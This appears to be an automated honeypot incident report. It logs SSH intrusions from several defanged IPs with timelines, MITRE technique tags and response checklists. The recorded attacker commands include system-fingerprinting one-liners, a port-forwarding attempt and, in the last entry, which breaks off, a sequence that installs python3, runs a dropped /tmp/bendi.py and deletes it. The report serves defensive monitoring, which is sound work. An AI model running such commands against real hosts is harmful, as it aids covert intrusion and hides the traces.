| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:29:28` | `cowrie.session.connect` |
| `2026-07-24 05:29:28` | `cowrie.client.version` |
| `2026-07-24 05:29:28` | `cowrie.client.kex` |
| `2026-07-24 05:29:32` | `cowrie.login.success` |
| `2026-07-24 05:29:35` | `cowrie.session.params` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.success` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:35` | `cowrie.command.input` |
| `2026-07-24 05:29:36` | `cowrie.log.closed` |
| `2026-07-24 05:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1b593abca9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:30 |
| **Last Seen** | 2026-07-24 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:30:24` | `cowrie.session.connect` |
| `2026-07-24 05:30:24` | `cowrie.client.version` |
| `2026-07-24 05:30:24` | `cowrie.client.kex` |
| `2026-07-24 05:30:24` | `cowrie.login.success` |
| `2026-07-24 05:30:25` | `cowrie.session.params` |
| `2026-07-24 05:30:25` | `cowrie.command.input` |
| `2026-07-24 05:30:25` | `cowrie.log.closed` |
| `2026-07-24 05:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3d5e3a46276

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:31 |
| **Last Seen** | 2026-07-24 05:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:31:35` | `cowrie.session.connect` |
| `2026-07-24 05:31:36` | `cowrie.client.version` |
| `2026-07-24 05:31:36` | `cowrie.client.kex` |
| `2026-07-24 05:31:39` | `cowrie.login.success` |
| `2026-07-24 05:31:41` | `cowrie.session.params` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.success` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:41` | `cowrie.command.input` |
| `2026-07-24 05:31:42` | `cowrie.log.closed` |
| `2026-07-24 05:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-167ec8ba2c24

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:32 |
| **Last Seen** | 2026-07-24 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:32:13` | `cowrie.session.connect` |
| `2026-07-24 05:32:13` | `cowrie.client.version` |
| `2026-07-24 05:32:13` | `cowrie.client.kex` |
| `2026-07-24 05:32:14` | `cowrie.login.success` |
| `2026-07-24 05:32:15` | `cowrie.session.params` |
| `2026-07-24 05:32:15` | `cowrie.command.input` |
| `2026-07-24 05:32:15` | `cowrie.log.closed` |
| `2026-07-24 05:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e7973fe2572

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:33 |
| **Last Seen** | 2026-07-24 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:33:43` | `cowrie.session.connect` |
| `2026-07-24 05:33:43` | `cowrie.client.version` |
| `2026-07-24 05:33:43` | `cowrie.client.kex` |
| `2026-07-24 05:33:46` | `cowrie.login.success` |
| `2026-07-24 05:33:48` | `cowrie.session.params` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.success` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:48` | `cowrie.command.input` |
| `2026-07-24 05:33:49` | `cowrie.log.closed` |
| `2026-07-24 05:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295a1b26e6ed

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:33 |
| **Last Seen** | 2026-07-24 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:33:58` | `cowrie.session.connect` |
| `2026-07-24 05:33:58` | `cowrie.client.version` |
| `2026-07-24 05:33:58` | `cowrie.client.kex` |
| `2026-07-24 05:33:58` | `cowrie.login.success` |
| `2026-07-24 05:33:59` | `cowrie.session.params` |
| `2026-07-24 05:33:59` | `cowrie.command.input` |
| `2026-07-24 05:33:59` | `cowrie.log.closed` |
| `2026-07-24 05:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae286420510

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-07-24 05:35 |
| **Last Seen** | 2026-07-24 05:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:35:11` | `cowrie.session.connect` |
| `2026-07-24 05:35:11` | `cowrie.client.version` |
| `2026-07-24 05:35:11` | `cowrie.client.kex` |
| `2026-07-24 05:35:13` | `cowrie.login.success` |
| `2026-07-24 05:35:13` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79cfec267f64

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:35 |
| **Last Seen** | 2026-07-24 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:35:41` | `cowrie.session.connect` |
| `2026-07-24 05:35:41` | `cowrie.client.version` |
| `2026-07-24 05:35:41` | `cowrie.client.kex` |
| `2026-07-24 05:35:42` | `cowrie.login.success` |
| `2026-07-24 05:35:43` | `cowrie.session.params` |
| `2026-07-24 05:35:43` | `cowrie.command.input` |
| `2026-07-24 05:35:43` | `cowrie.log.closed` |
| `2026-07-24 05:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f85b5a04362

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:35 |
| **Last Seen** | 2026-07-24 05:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:35:58` | `cowrie.session.connect` |
| `2026-07-24 05:35:59` | `cowrie.client.version` |
| `2026-07-24 05:35:59` | `cowrie.client.kex` |
| `2026-07-24 05:36:01` | `cowrie.login.success` |
| `2026-07-24 05:36:03` | `cowrie.session.params` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.success` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.command.input` |
| `2026-07-24 05:36:03` | `cowrie.log.closed` |
| `2026-07-24 05:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcd28cc4837c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:37 |
| **Last Seen** | 2026-07-24 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:37:29` | `cowrie.session.connect` |
| `2026-07-24 05:37:29` | `cowrie.client.version` |
| `2026-07-24 05:37:29` | `cowrie.client.kex` |
| `2026-07-24 05:37:29` | `cowrie.login.success` |
| `2026-07-24 05:37:30` | `cowrie.session.params` |
| `2026-07-24 05:37:30` | `cowrie.command.input` |
| `2026-07-24 05:37:30` | `cowrie.log.closed` |
| `2026-07-24 05:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc6866e8d0a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:38 |
| **Last Seen** | 2026-07-24 05:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:38:09` | `cowrie.session.connect` |
| `2026-07-24 05:38:09` | `cowrie.client.version` |
| `2026-07-24 05:38:09` | `cowrie.client.kex` |
| `2026-07-24 05:38:11` | `cowrie.login.success` |
| `2026-07-24 05:38:13` | `cowrie.session.params` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.success` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:13` | `cowrie.command.input` |
| `2026-07-24 05:38:14` | `cowrie.log.closed` |
| `2026-07-24 05:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3f8e3f9bc6c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:39 |
| **Last Seen** | 2026-07-24 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:39:14` | `cowrie.session.connect` |
| `2026-07-24 05:39:14` | `cowrie.client.version` |
| `2026-07-24 05:39:14` | `cowrie.client.kex` |
| `2026-07-24 05:39:14` | `cowrie.login.success` |
| `2026-07-24 05:39:15` | `cowrie.session.params` |
| `2026-07-24 05:39:15` | `cowrie.command.input` |
| `2026-07-24 05:39:15` | `cowrie.log.closed` |
| `2026-07-24 05:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c65ca6a4706

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:40 |
| **Last Seen** | 2026-07-24 05:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:40:20` | `cowrie.session.connect` |
| `2026-07-24 05:40:21` | `cowrie.client.version` |
| `2026-07-24 05:40:21` | `cowrie.client.kex` |
| `2026-07-24 05:40:23` | `cowrie.login.success` |
| `2026-07-24 05:40:25` | `cowrie.session.params` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.success` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:25` | `cowrie.command.input` |
| `2026-07-24 05:40:26` | `cowrie.log.closed` |
| `2026-07-24 05:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea14301dba83

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:40 |
| **Last Seen** | 2026-07-24 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:40:56` | `cowrie.session.connect` |
| `2026-07-24 05:40:56` | `cowrie.client.version` |
| `2026-07-24 05:40:56` | `cowrie.client.kex` |
| `2026-07-24 05:40:56` | `cowrie.login.success` |
| `2026-07-24 05:40:57` | `cowrie.session.params` |
| `2026-07-24 05:40:57` | `cowrie.command.input` |
| `2026-07-24 05:40:57` | `cowrie.log.closed` |
| `2026-07-24 05:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc4e4933f17

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:42 |
| **Last Seen** | 2026-07-24 05:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:42:36` | `cowrie.session.connect` |
| `2026-07-24 05:42:37` | `cowrie.client.version` |
| `2026-07-24 05:42:37` | `cowrie.client.kex` |
| `2026-07-24 05:42:39` | `cowrie.login.success` |
| `2026-07-24 05:42:41` | `cowrie.session.params` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.success` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.command.input` |
| `2026-07-24 05:42:41` | `cowrie.log.closed` |
| `2026-07-24 05:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ff9b64cb84

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:42 |
| **Last Seen** | 2026-07-24 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:42:41` | `cowrie.session.connect` |
| `2026-07-24 05:42:41` | `cowrie.client.version` |
| `2026-07-24 05:42:42` | `cowrie.client.kex` |
| `2026-07-24 05:42:42` | `cowrie.login.success` |
| `2026-07-24 05:42:43` | `cowrie.session.params` |
| `2026-07-24 05:42:43` | `cowrie.command.input` |
| `2026-07-24 05:42:43` | `cowrie.log.closed` |
| `2026-07-24 05:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-893acef652a9

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-24 05:43 |
| **Last Seen** | 2026-07-24 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:43:24` | `cowrie.session.connect` |
| `2026-07-24 05:43:24` | `cowrie.client.version` |
| `2026-07-24 05:43:24` | `cowrie.client.kex` |
| `2026-07-24 05:43:25` | `cowrie.login.success` |
| `2026-07-24 05:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95897bc695f8

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-24 05:43 |
| **Last Seen** | 2026-07-24 05:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:43:24` | `cowrie.session.connect` |
| `2026-07-24 05:43:24` | `cowrie.client.version` |
| `2026-07-24 05:43:24` | `cowrie.client.kex` |
| `2026-07-24 05:43:25` | `cowrie.login.success` |
| `2026-07-24 05:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cf9eb728ccc

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-24 05:43 |
| **Last Seen** | 2026-07-24 05:45 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
